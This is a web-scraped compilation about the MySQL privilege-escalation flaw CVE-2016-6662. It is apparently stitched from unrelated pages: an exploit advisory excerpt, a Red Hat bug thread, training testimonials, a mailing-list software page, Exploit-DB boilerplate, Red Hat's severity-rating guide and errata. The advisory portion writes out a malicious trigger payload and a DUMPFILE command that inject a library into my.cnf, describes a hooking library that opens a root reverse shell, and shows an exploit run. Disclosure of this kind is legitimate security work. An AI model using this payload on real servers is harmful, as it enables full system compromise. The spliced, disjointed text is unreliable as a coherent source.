The undisclosed vulnerability makes it easy for certain attackers to create
/var/lib/mysql/my.cnf file with arbitrary contents without the FILE privilege
requirement.

~~~~~~~~~~~~~~~~~~~~~~~~~
3) Attackers with only SELECT/FILE permissions can gain access to logging functions
(normally only available to MySQL admin users) on all of the _default_ MySQL
installations and thus be in position to add/modify MySQL config files.

If attackers do not have administrative rights required to access logging settings
and only have standard user privileges with the addition of FILE privilege then
they could still gain the ability to write to / modify configuration files.

This could be achieved by writing a malicious trigger payload - a trigger
definition that is an _equivalent_ to the following statement:

CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf
AFTER INSERT
   ON `active_table` FOR EACH ROW
BEGIN
   DECLARE void varchar(550);
   set global general_log_file='/var/lib/mysql/my.cnf';
   set global general_log = on;
   select "
[mysqld]
malloc_lib='/var/lib/mysql/mysql_hookandroot_lib.so'

" INTO void;
   set global general_log = off;
END;

into a trigger definition/configuration file (.TRG) of an actively used table
('active_table') with the use of a statement similar to:

SELECT '...trigger_definition...' INTO DUMPFILE /var/lib/mysql/activedb/active_table.TRG'

Note that _only_ the above SELECT statement is required to write out the trigger
definition by abusing the power of FILE privilege.
The CREATE TRIGGER statement is _never_ executed and is not necessary. This
means that SUPER privilege is not necessary either. See the exploit code for
details.

Such trigger will be loaded when tables get flushed. From this point on
whenever an INSERT statement is invoked on the table, e.g:

INSERT INTO `active_table` VALUES('xyz');

The trigger's code will be executed with mysql root/admin privileges (notice
'DEFINER' above) and will thus let attacker to modify the general_log settings
despite the lack of administrative/SUPER privileges through their user account
(with SELECT/FILE privileges only).

MySQL / MariaDB / Percona -  Remote Root Code Execution / Privesc PoC Exploit
CVE-2016-6662
mysql_hookandroot_lib.c

This is the shared library injected by 0ldSQL_MySQL_RCE_exploit.py exploit.
The library is meant to be loaded by mysqld_safe on mysqld daemon startup
to create a reverse shell that connects back to the attacker's host on
6603 port (mysql port in reverse ;) and provides a root shell on the
target.

mysqld_safe will load this library through the following setting:

[mysqld]
malloc_lib=mysql_hookandroot_lib.so

in one of the my.cnf config files (e.g. /etc/my.cnf).

This shared library will hook the execvp() function which is called
during the startup of mysqld process.
It will then fork a reverse shell and clean up the poisoned my.cnf
file in order to let mysqld run as normal so that:
'service mysql restart' will work without a problem.

Before compiling adjust IP / PORT and config path.

------------------------------------------------

Replication / testing:
~~~~~~~~~~~~~~~~~~

As admin on the target system:
~~~~~~~~

1. Set up a test database account/permissions:

CREATE DATABASE pocdb;
GRANT FILE ON *.* TO 'attacker'@'%' IDENTIFIED BY 'p0cpass!';
GRANT SELECT, INSERT, CREATE ON `pocdb`.* TO 'attacker'@'%';

2.  Simulate write access on any of available mysql configs.
It just needs to be a valid/parsable config with section e.g:

[isamchk]
key_buffer		= 16M

For example, /etc/mysql/my.cnf on Debian:

# chown mysql:mysql /etc/mysql/my.cnf

# ls -l /etc/mysql/my.cnf
-rw-r--r-- 1 mysql mysql 3534 Sep 11 02:15 /etc/mysql/my.cnf

3. Run the exploit as the attacker and restart mysql when exploit
is done.

Note that attackers could be able to force this step remotely by
issuing a remote SHUTDOWN command/SQL statement.

As attacker:
~~~~~~~~

1. Enter your library path in mysql_hookandroot_lib.c src.

2. Run the 0ldSQL_MySQL_RCE_exploit.py script.

Example run:
~~~~~~~~

attacker$ ./0ldSQL_MySQL_RCE_exploit.py -dbuser attacker -dbpass 'p0cpass!' -dbhost 192.168.1.10 -dbname pocdb -mycnf /etc/mysql/my.cnf

VII. BUSINESS IMPACT
-------------------------

As discussed above the vulnerability could be exploited by attackers with both
privileged and unprivileged (with FILE privilege only) access to mysql accounts.
It could also be combined with CVE-2016-6663 vulnerability which will be released
shortly and could allow certain attackers to escalate their privileges to root
even without FILE privilege.

The vulnerability could also be exploited via an SQL injection vector, which
removes the need for the attackers to have direct mysql connection and increases
the risk of exploitation.

Successful exploitation could gain a attacker a remote shell with root privileges
which would allow them to fully compromise the remote system.

If exploited, the malicious code would run as soon as MySQL daemon gets
restarted.
As mentioned, the restart could be triggered manually, via a system update,
package update (including an update of dependencies), system reboot etc.).
Attackers might also be able to speed up the server restart remotely by issuing
a SHUTDOWN SQL statement or 'shutdown' command via mysqladmin.

VIII. SYSTEMS AFFECTED
-------------------------

All MySQL versions from the oldest versions to the latest shown at the beginnig
of this advisory.

Some systems run MySQL via Systemd and provide direct startup path to mysqld
daemon instead of using mysqld_safe wrapper script. These systems however are
also at risk as mysqld_safe may be called on update by the installation scripts
or some other system services. It could also be triggered manually by
administrators running mysqld_safe as a habit.

Because the exploit only accesses files normally used by MySQL server (
such as the config), and the injected library is preloaded by mysqld_safe startup
scripta not included within the default policies, the vulnerability can be
exploited even if security modules as SELinux and AppArmor are installed with
active security policies for the MySQL daemon.

IX. VENDOR RESPONSE / SOLUTION
-------------------------

The vulnerability was reported to Oracle on 29th of July 2016 and triaged
by the security team.
It was also reported to the other affected vendors including PerconaDB and MariaDB.

The vulnerabilities were patched by PerconaDB and MariaDB vendors in all branches
by 30th of August.
During the course of the patching process by these vendors the patches went into
public repositories and the fixed security issues were also mentioned in the
new releases which could be noticed by malicious attackers.

As over 40 days have passed since reporting the issues and patches were already
mentioned publicly (by Percona and MariaDB) , a decision was made to start
disclosing vulnerabilities (with limited PoC) to inform users about the risks
before the vendor's next CPU update (scheduled for 18th of October).

No official patches or mitigations are available at this time from the vendor.
As temporary mitigations, users should ensure that no mysql config files are
owned by mysql user, and create root-owned dummy my.cnf files that are not in
use.
These are by no means a complete solution and users should apply official vendor
patches as soon as they become available.

Update (16/09/2016):
It has been found that the vendor silently (i.e. without notifing the researcher
via a direct communication despite the ongoing private communication via email,
nor via releasing an immediate public Security Alert to publicly announce the
critical fixes) released security patches for the CVE-2016-6662 vulnerability in

| [Description](show_bug.cgi?id=1378936#c0)  Tomas Hoger    2016-09-23 14:35:00 UTC  ``` Dawid Golunski, reporter of [CVE-2016-6662](https://access.redhat.com/security/cve/CVE-2016-6662) ([bug 1375198](show_bug.cgi?id=1375198 "CLOSED ERRATA - CVE-2016-6662 mysql: general_log can write to configuration files, leading to privilege escalation (CPU Oct 2016)")), mentioned existence of a privilege escalation vulnerability which should allow a non-privileged database user without FILE permissions to escalate their privileges to database or system administrator.  Quoting from the advisory for CVE-2016-6662:  <http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.txt>    It could also be combined with [CVE-2016-6663](https://access.redhat.com/security/cve/CVE-2016-6663) vulnerability which will be released   shortly and could allow certain attackers to escalate their privileges to root    even without FILE privilege.  No further details are available at the moment.   ```  [Comment 3](show_bug.cgi?id=1378936#c3)  Tomas Hoger    2016-10-25 07:57:12 UTC  ``` This issue is now listed as fixed in MariaDB versions 5.5.52 and 10.1.18:  <https://mariadb.com/kb/en/mariadb/mariadb-5552-release-notes/> <https://mariadb.com/kb/en/mariadb/mariadb-10118-release-notes/>  According to MariaDB upstream, the CVE is for race condition issue fixed in this commit:  <https://github.com/MariaDB/server/commit/347eeefbfc658c8531878218487d729f4e020805>  Corresponding MySQL commit is:  <https://github.com/mysql/mysql-server/commit/4e5473862e6852b0f3802b0cd0c6fa10b5253291>  and it was applied in MySQL versions 5.5.52, 5.6.33, and 5.7.15.   ```  [Comment 4](show_bug.cgi?id=1378936#c4)  Tomas Hoger    2016-10-25 08:00:03 UTC  ``` We also believe that Oracle decided to assign a duplicate CVE id for this issue - [CVE-2016-5616](https://access.redhat.com/security/cve/CVE-2016-5616) tracked via [bug 1386562](show_bug.cgi?id=1386562 "CLOSED DUPLICATE - CVE-2016-5616 mysql: unspecified vulnerability in subcomponent: Server: MyISAM (CPU October 2016)").

Copying the whole text of [bug 1386562 comment 4](show_bug.cgi?id=1386562#c4 "CLOSED DUPLICATE - CVE-2016-5616 mysql: unspecified vulnerability in subcomponent: Server: MyISAM (CPU October 2016)") here, as [bug 1386562](show_bug.cgi?id=1386562 "CLOSED DUPLICATE - CVE-2016-5616 mysql: unspecified vulnerability in subcomponent: Server: MyISAM (CPU October 2016)") was closed as duplicate of this bug.  --  The only change in MyISAM sub-component of MySQL in the listed versions is:  <https://github.com/mysql/mysql-server/commit/4e5473862e6852b0f3802b0cd0c6fa10b5253291>  To exploit this flaw, attacker needs to have a local shell access on the server running MySQL server, and have write access to the data directory used to store database files.  The data directory is normally only writeable to the mysql system user, who has full control over database files anyway.  However, MyISAM engine allows users creating database tables to specify location where data files are stored using DATA DIRECTORY and INDEX DIRECTORY clauses for CREATE TABLE.  That way, database files can be stored in any directory writeable to a local user.  The DATA DIRECTORY and INDEX DIRECTORY clause is only applied when mysqld is running with symlink support enabled.  The symlinks support is controlled via symbolic-links configuration directive and --symbolic-links / --skip-symbolic-links command line options.  The default configuration of all MySQL and MariaDB packages on Red Hat Enterprise Linux 6 and later is to disable symlink support - symbolic-links=0 setting is used in the default my.cnf.  With this setting, only mysql system user should be able to exploit this flaw.

### Duane LaFlotte

CTO, Pulsar Security

  I feel like every person's first experience in cybersecurity should be OffSec. Before you go out to figure out how to create a zero-day and you get confused, if you start with OffSec, that won't happen due to how methodologically all the training is put together.      ![Emile Kok](/_astro/emile.C3f2EqfQ.png)

Founder and Managing Director, TSTC Institute

  When going to the real world, you have to know what you're doing and understand what is expected from you on the job. For us, OffSec is the champion in this league in educating and preparing learners.      ![Douglas Costa](/_astro/douglas.BdxOPM2d.png)

# blists - web interface to mailing list archives

blists is a web interface to mailing list archives that works off indexed mbox files.
There are two programs: *bindex* and *bit*.
*bindex* generates or updates the index file (yes, incremental updates are supported).
*bit* is a CGI/SSI program that generates web pages on the fly.
Both programs are written in C and are very fast.

You can view the latest <README> file,
which describes blists in more detail and provides installation instructions.
It is also included in the archive below.

Download ([release notes](/lists/announce/2017/11/19/1)):

* [blists 2.0](blists-2.0.tar.gz) and
  its [signature](blists-2.0.tar.gz.sign)* [blists 1.0](blists-1.0.tar.gz) and
    its [signature](blists-1.0.tar.gz.sign)

These files are also
[available from the Openwall file archive](https://download.openwall.net/pub/projects/blists/).
The source code of blists can be browsed on
[GitHub](https://github.com/openwall/blists) or via
[CVSweb](https://cvsweb.openwall.com/blists).

Follow [this link](/signatures/) for information on verifying the signatures.

# the advisory for details on this vector.
#
# Full PoC will be released at a later date, and will show how attackers could
# exploit the vulnerability on default installations of MySQL on systems with no

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

#### Description

Earlier MySQL used to read my.cnf from three locations, in that order:

* /etc
* datadir
* $HOME/.my.cnf

The second is particularly unsafe, because datadir is writable by the mysqld server, and a user that can connect to MySQL can create my.cnf in the datadir using SELECT ... OUTFILE. Over time various safety mechanisms were implemented:

* mysqld no longer reads my.cnf in the datadir. Still, mysqld\_safe.sh does and forces the server to, so if the server is started via mysqld\_safe.sh, my.cnf in the datadir is still used.
* --secure-file-priv command-line option limits SELECT ... OUTFILE to the specified directory, it's recommended to set it outside of datadir
* SELECT ... OUTFILE creates files that are world-writable and mysqld refuses to read my.cnf if it is world-writable.

But as was recently discovered by [Dawid Golunski](http://legalhackers.com), one can abuse @@general\_log\_file variable to create a my.cnf in the datadir, and it will be not created world-writable, so the both mysqld\_safe and mysqld will read it on startup.

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2016%3A2130)

## Topic

An update for mysql55-mysql is now available for Red Hat Software Collections.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

MySQL is a multi-user, multi-threaded SQL database server. It consists of the MySQL server daemon, mysqld, and many client programs.

The following packages have been upgraded to a newer upstream version: mysql55-mysql (5.5.52).

Security Fix(es):

* It was discovered that the MySQL logging functionality allowed writing to MySQL configuration files. An administrative database user, or a database user with FILE privileges, could possibly use this flaw to run arbitrary commands with root privileges on the system running the database server. (CVE-2016-6662)
* This update fixes several vulnerabilities in the MySQL database server. Information about these flaws can be found on the Oracle Critical Patch Update Advisory page, listed in the References section. (CVE-2016-3492, CVE-2016-5612, CVE-2016-5616, CVE-2016-5617, CVE-2016-5624, CVE-2016-5626, CVE-2016-5629, CVE-2016-8283)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

After installing this update, the MySQL server daemon (mysqld) will be restarted automatically.

## Synopsis

Important: mariadb-galera security and bug fix update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2016%3A2077)

## Topic

An update for mariadb-galera is now available for Red Hat OpenStack Platform 8.0 (Liberty).

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

MariaDB is a multi-user, multi-threaded SQL database server that is binary compatible with MySQL. Galera is a synchronous multi-master cluster for MariaDB.

Security Fix(es):

* It was discovered that the MySQL logging functionality allowed writing to MySQL configuration files. An administrative database user, or a database user with FILE privileges, could possibly use this flaw to run arbitrary commands with root privileges on the system running the database server. (CVE-2016-6662)

Bug Fix(es):

* Previously, both the mariadb-server and mariadb-galera-server packages shipped the client-facing libraries, dialog.so and mysql\_clear\_password.so. As a result, the mariadb-galera-server package would fail to install because of package conflicts. With this update, these libraries have been moved from mariadb-galera-server to mariadb-libs, and the mariadb-galera-server package installs successfully. (BZ#1376905)
* Because Red Hat Enterprise Linux 7.3 changed the return format of the "systemctl is-enabled" command as consumed by shell scripts, the mariadb-galera RPM package, upon installation, erroneously detected that the MariaDB service was enabled when it was not. As a result, the Red Hat OpenStack Platform installer, which then tried to run mariadb-galera using Pacemaker and not systemd, failed to start Galera. With this update, mariadb-galera's RPM installation scripts now use a different systemctl command, correctly detecting the default MariaDB as disabled, and the installer can succeed. (BZ#1376913)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

After installing this update, the MariaDB server daemon (mysqld) will be restarted automatically.

## Affected Products

* Red Hat OpenStack 8 x86\_64

## Fixes

* [BZ - 1375198](https://bugzilla.redhat.com/show_bug.cgi?id=1375198)
  - CVE-2016-6662 mysql: general\_log can write to configuration files, leading to privilege escalation
* [BZ - 1376905](https://bugzilla.redhat.com/show_bug.cgi?id=1376905)
  - RHEL 7.3 upgrades fails on upgrade because of mariadb-libs package conflict.
* [BZ - 1376913](https://bugzilla.redhat.com/show_bug.cgi?id=1376913)
